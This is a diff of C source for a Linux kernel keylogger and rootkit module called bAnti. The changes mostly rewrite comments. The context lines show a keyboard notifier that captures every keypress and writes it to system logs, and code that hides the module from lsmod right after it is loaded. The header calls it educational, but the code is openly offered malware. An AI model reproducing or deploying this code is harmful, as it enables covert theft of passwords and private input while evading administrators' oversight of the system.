@@ -1,32 +1,28 @@
-/*---------------------------------------------------------------------
-
- keylog is simple Kernel Based KeyLogger module for project
- bAnti. It is developed for educational purposes only and authors 
- of this project are in no way, shape or form responsible for 
- what you may use this for whether illegal or not.
-
- Copyright (c) 2015 Sun Dro (a.k.a. 7th Ghost / kala13x)
- Web: http://off-sec.com/ ; E-Mail: kala0x13@gmail.com
-
- Everyone is permitted to copy and distribute verbatim or modified
- copies of this license document, and changing it is allowed as long
- as the name is changed. See http://wtfpl.net/ for more details.
- 
- DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE TERMS AND CONDITIONS 
- FOR COPYING, DISTRIBUTION AND MODIFICATION
-
- 0. You just DO WHAT THE FUCK YOU WANT TO.
-
----------------------------------------------------------------------*/
+/*
+ *   keylog is simple Kernel Based KeyLogger module for project
+ *   bAnti. It is developed for educational purposes only and authors 
+ *   of this project are in no way, shape or form responsible for 
+ *   what you may use this for whether illegal or not.
+ *
+ *   Copyright (c) 2015 Sun Dro (a.k.a. 7th Ghost / kala13x)
+ *   Web: http://off-sec.com/ ; E-Mail: kala0x13@gmail.com
+ *
+ * Everyone is permitted to copy and distribute verbatim or modified
+ * copies of this license document, and changing it is allowed as long
+ * as the name is changed. See http://wtfpl.net/ for more details.
+ *
+ * DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE TERMS AND CONDITIONS 
+ * FOR COPYING, DISTRIBUTION AND MODIFICATION
+ *
+ * 0. You just DO WHAT THE FUCK YOU WANT TO.
+ */
 
 
 /* Linux includes */
 #include "stdinc.h"
 
 
-/*---------------------------------------------
-| Flags of banti module
----------------------------------------------*/
+/* Flags of banti module */
 typedef struct { 
     short module_hidden;
     short got_key;
@@ -39,9 +35,9 @@ static struct list_head *module_prev;
 static struct list_head *module_kobj_prev;
 
 
-/*---------------------------------------------
-| Initialise banti flags
----------------------------------------------*/
+/*
+ * Initialise bantikit flags
+ */
 void init_banti(void) 
 {
     fl->module_hidden = 0;
@@ -49,9 +45,11 @@ void init_banti(void)
 }
 
 
-/*---------------------------------------------
-| Handle key signal and return in char value
----------------------------------------------*/
+/*
+ * Function handle key signal and returns key 
+ * in char value. Its uses switch operator, but
+ * should be better if it will be done with arrays.
+ */
 char banti_handle_key(int key)
 {
     char ret;
@@ -219,9 +217,12 @@ char banti_handle_key(int key)
 }
 
 
-/*---------------------------------------------
-| Hide module
----------------------------------------------*/
+/*
+ * Hide module
+ *
+ * Function hides module from module list so
+ * it can not be checked with lsmod command
+ */
 void banti_module_hide(void)
 {
     /* Check if alredy hidden */
@@ -241,9 +242,12 @@ void banti_module_hide(void)
 }
 
 
-/*---------------------------------------------
-| Make module visible
----------------------------------------------*/
+/*
+ * Make module visible
+ *
+ * Function makes module visible again afther 
+ * its hidden with banti_module_hide() function
+ */
 void banti_module_show(void)
 {
     int result;
@@ -261,9 +265,12 @@ void banti_module_show(void)
 }
 
 
-/*---------------------------------------------
-| Get notifed press key
----------------------------------------------*/
+/*
+ * Get notifed press key
+ * 
+ * Function catchs keypress from notifier block, handles
+ * key code and writes finall char value in /var/log/messages
+ */
 int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_param) 
 {
     /* Used variables */
@@ -284,18 +291,22 @@ int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_
 }
 
 
-/*---------------------------------------------
-| Module notification block
----------------------------------------------*/
+/*
+ * Module notification block
+ */
 static struct notifier_block notifer_deamon =
 {
     .notifier_call = banti_key_notifer
 };
 
 
-/*---------------------------------------------
-| Register keyboard module
----------------------------------------------*/
+/*
+ * Initialise module
+ *
+ * Function initialises module with insmod command
+ * is given and hides it afther initialisation
+ */
+
 static int __init banti_keylog_init(void)
 {
     /* Hide module */
@@ -309,9 +320,9 @@ static int __init banti_keylog_init(void)
 }
 
 
-/*---------------------------------------------
-| Clean keyboard module
----------------------------------------------*/
+/*
+ * Clean rootkit module with rmmod command
+ */
 static void __exit banti_keylog_clean(void)
 {
     unregister_keyboard_notifier(&notifer_deamon);
@@ -319,9 +330,7 @@ static void __exit banti_keylog_clean(void)
 }
 
 
-/*---------------------------------------------
-| Module initialisations
----------------------------------------------*/
+/* Module initialisations */
 module_init(banti_keylog_init);
 module_exit(banti_keylog_clean);
 MODULE_LICENSE(DRIVER_LICENSE);
